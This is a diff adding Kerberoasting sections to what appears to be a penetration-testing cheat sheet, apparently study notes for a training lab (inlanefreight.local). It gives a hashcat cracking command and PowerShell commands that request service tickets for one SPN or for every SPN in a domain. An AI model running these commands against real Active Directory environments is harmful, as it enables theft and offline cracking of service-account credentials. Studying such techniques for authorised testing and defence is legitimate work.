@@ -1270,5 +1270,37 @@ Look at the prefix of the Kerberos hash:
 
 ```bash
 hashcat -m 13100 <tgs_file_or_hash> <wordlist>
+```
+---
 
+## Kerberoasting (Windows) — Manual TGS request via .NET (no Rubeus)
+
+### Purpose
+Request a Kerberos service ticket (TGS) for a known SPN using .NET.  
+This does **not** print a hash by itself — it only forces Windows to fetch the ticket into memory so it can later be extracted (e.g., using ticket extraction tools).
+
+### Syntax
+```powershell
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
+```
+Example
+```powershell
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+```
+
+### Kerberoasting — Bulk TGS request using setspn + PowerShell
+Kerberoasting — Bulk TGS request using setspn + PowerShell
+Purpose
+Enumerate all SPNs in the domain and automatically request a TGS for each one.
+```powershell
+setspn.exe -T <DOMAIN> -Q */* |
+Select-String '^CN' -Context 0,1 |
+% { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+```
+Example
+```powershell
+setspn.exe -T INLANEFREIGHT.LOCAL -Q */* |
+Select-String '^CN' -Context 0,1 |
+% { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+```
 
